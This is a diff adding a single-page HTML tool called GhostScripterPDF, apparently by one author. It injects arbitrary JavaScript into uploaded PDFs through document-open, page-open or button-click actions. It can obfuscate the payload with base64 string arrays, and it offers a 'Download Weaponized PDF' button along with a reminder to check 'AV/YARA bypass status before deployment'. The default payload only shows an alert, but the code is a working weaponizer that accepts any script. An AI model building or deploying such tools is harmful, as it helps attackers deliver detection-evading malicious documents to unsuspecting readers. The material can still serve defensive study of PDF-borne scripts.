@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GhostScripterPDF | Client-Side PDF JS Injection</title>
+    <meta name="description" content="Client-side PDF JavaScript injection and obfuscation engine for browser sandbox research.">
+    <style>
+        :root {
+            --bg: #0a0c0f;
+            --panel: #111418;
+            --border: #2a2f35;
+            --accent: #00ff9d;
+            --accent-dim: #00cc7d;
+            --text: #e2e8f0;
+            --text-dim: #8b949e;
+            --danger: #ff4d4d;
+            --mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: var(--mono);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            line-height: 1.6;
+        }
+
+        header {
+            padding: 1.5rem 2rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--panel);
+        }
+
+        .brand h1 {
+            font-size: 1.4rem;
+            letter-spacing: 1px;
+            color: var(--accent);
+            text-shadow: 0 0 8px rgba(0, 255, 157, 0.4);
+        }
+
+        .brand span {
+            font-size: 0.8rem;
+            color: var(--text-dim);
+            display: block;
+        }
+
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            padding: 2rem;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+        }
+
+        .panel h2 {
+            font-size: 1rem;
+            color: var(--text-dim);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        /* Dropzone */
+        #dropzone {
+            border: 2px dashed var(--border);
+            border-radius: 4px;
+            padding: 3rem 2rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            background: rgba(0, 255, 157, 0.02);
+        }
+        #dropzone.dragover {
+            border-color: var(--accent);
+            background: rgba(0, 255, 157, 0.08);
+            box-shadow: inset 0 0 20px rgba(0, 255, 157, 0.1);
+        }
+        #dropzone p { color: var(--text-dim); font-size: 0.9rem; }
+        #dropzone .icon { font-size: 2rem; margin-bottom: 1rem; color: var(--accent); }
+
+        /* Controls */
+        .control-group { display: flex; flex-direction: column; gap: 0.5rem; }
+        label { font-size: 0.85rem; color: var(--text-dim); }
+        
+        select, textarea {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            color: var(--text);
+            font-family: var(--mono);
+            padding: 0.6rem;
+            border-radius: 2px;
+            outline: none;
+            width: 100%;
+        }
+        select:focus, textarea:focus { border-color: var(--accent-dim); }
+        textarea { resize: vertical; min-height: 120px; font-size: 0.85rem; }
+
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            background: rgba(255,255,255,0.02);
+            padding: 0.8rem;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+        }
+        input[type="checkbox"] { accent-color: var(--accent); width: 16px; height: 16px; }
+
+        button {
+            background: transparent;
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            font-family: var(--mono);
+            padding: 0.8rem 1.5rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.2s;
+            border-radius: 2px;
+            font-weight: bold;
+        }
+        button:hover:not(:disabled) { background: var(--accent); color: var(--bg); box-shadow: 0 0 15px rgba(0, 255, 157, 0.3); }
+        button:disabled { opacity: 0.4; cursor: not-allowed; border-color: var(--border); color: var(--text-dim); }
+        
+        .btn-download { border-color: var(--text-dim); color: var(--text-dim); display: none; margin-top: auto; }
+        .btn-download:hover { background: var(--text-dim); color: var(--bg); box-shadow: none; }
+
+        /* Log */
+        #log {
+            background: var(--bg);
+            border: 1px solid var(--border);
+            padding: 1rem;
+            font-size: 0.8rem;
+            height: 150px;
+            overflow-y: auto;
+            color: var(--text-dim);
+            flex-grow: 1;
+        }
+        #log .info { color: var(--accent); }
+        #log .error { color: var(--danger); }
+
+        footer {
+            text-align: center;
+            padding: 1.5rem;
+            border-top: 1px solid var(--border);
+            font-size: 0.85rem;
+            color: var(--text-dim);
+            background: var(--panel);
+        }
+        footer strong { color: var(--text); }
+
+        @media (max-width: 900px) { main { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="brand">
+            <h1>GhostScripterPDF</h1>
+            <span>Client-Side PDF Action Injection & Obfuscation Engine</span>
+        </div>
+        <div style="font-size: 0.75rem; color: var(--text-dim);">ISO 32000-1 / PDFium Target</div>
+    </header>
+
+    <main>
+        <!-- Input Panel -->
+        <section class="panel">
+            <h2>01 // Source Document</h2>
+            <div id="dropzone">
+                <div class="icon">⬡</div>
+                <p>Drag & Drop PDF or Click to Browse</p>
+                <input type="file" id="fileInput" accept="application/pdf" hidden>
+            </div>
+            
+            <div class="control-group">
+                <label for="injectPoint">Injection Vector</label>
+                <select id="injectPoint">
+                    <option value="openAction">Catalog /OpenAction (Document Load)</option>
+                    <option value="pageOpen">Page /AA /O (Page View)</option>
+                    <option value="formField">Widget /AA /D (Interactive Trigger - Chrome Safe)</option>
+                </select>
+            </div>
+
+            <div class="toggle-row">
+                <input type="checkbox" id="obfuscateToggle">
+                <label for="obfuscateToggle">Enable Client-Side JS Obfuscation (String Array + Base64)</label>
+            </div>
+
+            <div class="control-group">
+                <label for="payload">JavaScript Payload</label>
+                <textarea id="payload" spellcheck="false">try {
+    app.alert({ cMsg: "GhostScripterPDF // Execution Verified", cTitle: "Audit" });
+} catch(e) {
+    // Chrome PDFium fallback: mutate form field to prove execution
+    var f = this.getField("gs_status");
+    if(f) f.value = "EXEC_OK_" + new Date().getTime();
+}</textarea>
+            </div>
+        </section>
+
+        <!-- Output Panel -->
+        <section class="panel">
+            <h2>02 // Execution Console</h2>
+            <div id="log"></div>
+            <button id="generateBtn" disabled>Inject & Compile PDF</button>
+            <button id="downloadBtn" class="btn-download">Download Weaponized PDF</button>
+        </section>
+    </main>
+
+    <footer>
+        Made By <strong>Aryan Giri</strong> | <strong>giriaryan694-a11y</strong>
+    </footer>
+
+    <!-- Dependencies via CDN (GitHub Pages Friendly) -->
+    <script src="https://cdn.jsdelivr.net/npm/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/javascript-obfuscator@4.1.1/dist/javascript-obfuscator.min.js"></script>
+
+    <script>
+        const { PDFDocument, PDFName, PDFString, PDFDict } = PDFLib;
+        
+        const dropzone = document.getElementById('dropzone');
+        const fileInput = document.getElementById('fileInput');
+        const generateBtn = document.getElementById('generateBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const logBox = document.getElementById('log');
+        
+        let originalPdfBytes = null;
+        let compiledBlob = null;
+
+        // --- Logging Utility ---
+        function log(msg, type = '') {
+            const line = document.createElement('div');
+            if (type) line.className = type;
+            line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logBox.appendChild(line);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        // --- Drag & Drop / File Picker ---
+        dropzone.addEventListener('click', () => fileInput.click());
+        dropzone.addEventListener('dragover', (e) => { e.preventDefault(); dropzone.classList.add('dragover'); });
+        dropzone.addEventListener('dragleave', () => dropzone.classList.remove('dragover'));
+        dropzone.addEventListener('drop', (e) => {
+            e.preventDefault();
+            dropzone.classList.remove('dragover');
+            if (e.dataTransfer.files.length) handleFile(e.dataTransfer.files[0]);
+        });
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length) handleFile(e.target.files[0]);
+        });
+
+        async function handleFile(file) {
+            if (file.type !== 'application/pdf') return log('ERROR: Invalid file type. PDF required.', 'error');
+            try {
+                originalPdfBytes = await file.arrayBuffer();
+                dropzone.innerHTML = `<div class="icon" style="color:var(--accent)">✓</div><p>${file.name} loaded into memory</p>`;
+                generateBtn.disabled = false;
+                log(`Loaded ${file.name} (${(file.size / 1024).toFixed(2)} KB) into ArrayBuffer.`, 'info');
+            } catch (err) {
+                log(`File read failed: ${err.message}`, 'error');
+            }
+        }
+
+        // --- Obfuscation Pipeline ---
+        function obfuscatePayload(code) {
+            if (!document.getElementById('obfuscateToggle').checked) return code;
+            log('Running client-side obfuscation (StringArray + Base64)...');
+            try {
+                const result = JavaScriptObfuscator.obfuscate(code, {
+                    compact: true,
+                    controlFlowFlattening: false, // Prevents breaking PDF JS engines
+                    deadCodeInjection: false,
+                    stringArray: true,
+                    stringArrayEncoding: ['base64'],
+                    splitStrings: true,
+                    splitStringsChunkLength: 5
+                });
+                return result.getObfuscatedCode();
+            } catch (e) {
+                log(`Obfuscation failed, falling back to raw: ${e.message}`, 'error');
+                return code;
+            }
+        }
+
+        // --- PDF Injection Engine ---
+        generateBtn.addEventListener('click', async () => {
+            if (!originalPdfBytes) return;
+            generateBtn.disabled = true;
+            generateBtn.textContent = 'Compiling...';
+            log('Initializing PDF object tree parsing...');
+
+            try {
+                const pdfDoc = await PDFDocument.load(originalPdfBytes);
+                const context = pdfDoc.context;
+                const vector = document.getElementById('injectPoint').value;
+                let rawPayload = document.getElementById('payload').value;
+                const finalPayload = obfuscatePayload(rawPayload);
+
+                // Construct ISO 32000 JavaScript Action Dictionary
+                const jsAction = context.obj({
+                    Type: 'Action',
+                    S: 'JavaScript',
+                    JS: PDFString.of(finalPayload)
+                });
+
+                log(`Injection Vector: ${vector}`);
+
+                if (vector === 'openAction') {
+                    pdfDoc.catalog.set(PDFName.of('OpenAction'), jsAction);
+                    log('Bound JSAction to /Catalog /OpenAction.');
+                } 
+                else if (vector === 'pageOpen') {
+                    const pages = pdfDoc.getPages();
+                    pages.forEach((page, idx) => {
+                        const aa = context.obj({ O: jsAction });
+                        page.node.set(PDFName.of('AA'), aa);
+                    });
+                    log(`Bound JSAction to /AA /O on ${pages.length} page(s).`);
+                } 
+                else if (vector === 'formField') {
+                    // Chrome PDFium relies on interactive Widget annotations.
+                    // We inject a PushButton with a MouseDown (/D) trigger.
+                    const page = pdfDoc.getPages()[0];
+                    const annotDict = context.obj({
+                        Type: 'Annot',
+                        Subtype: 'Widget',
+                        FT: 'Btn',
+                        Rect: [50, 700, 250, 750], // Visible clickable zone
+                        T: PDFString.of('GS_Trigger'),
+                        Ff: 65536, // PushButton flag
+                        H: 'P',    // Highlight on push
+                        AA: { D: jsAction },
+                        // Minimal appearance stream required for PDFium to render it
+                        AP: context.obj({ 
+                            N: context.obj({ 
+                                Type: 'XObject', Subtype: 'Form', BBox: [0,0,200,50],
+                                Resources: context.obj({}),
+                                Contents: 'q 0 0 200 50 re f Q' // Draw a simple box
+                            }) 
+                        })
+                    });
+
+                    let annots = page.node.lookup(PDFName.of('Annots'));
+                    if (!annots) {
+                        annots = context.obj([]);
+                        page.node.set(PDFName.of('Annots'), annots);
+                    }
+                    annots.push(annotDict);
+                    log('Injected interactive Widget /AA /D trigger on Page 1. (Chrome PDFium compatible).');
+                }
+
+                // Rebuild XRef & Serialize
+                const modifiedBytes = await pdfDoc.save();
+                compiledBlob = new Blob([modifiedBytes], { type: 'application/pdf' });
+                
+                downloadBtn.style.display = 'block';
+                log('XRef table rebuilt. Serialization complete. Payload armed.', 'info');
+            } catch (err) {
+                log(`Compilation Error: ${err.message}`, 'error');
+                console.error(err);
+            } finally {
+                generateBtn.disabled = false;
+                generateBtn.textContent = 'Inject & Compile PDF';
+            }
+        });
+
+        // --- Download Handler ---
+        downloadBtn.addEventListener('click', () => {
+            if (!compiledBlob) return;
+            const url = URL.createObjectURL(compiledBlob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `GhostScripter_${Date.now()}.pdf`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            log('Download triggered. Check local AV/YARA bypass status before deployment.');
+        });
+    </script>
+</body>
+</html>
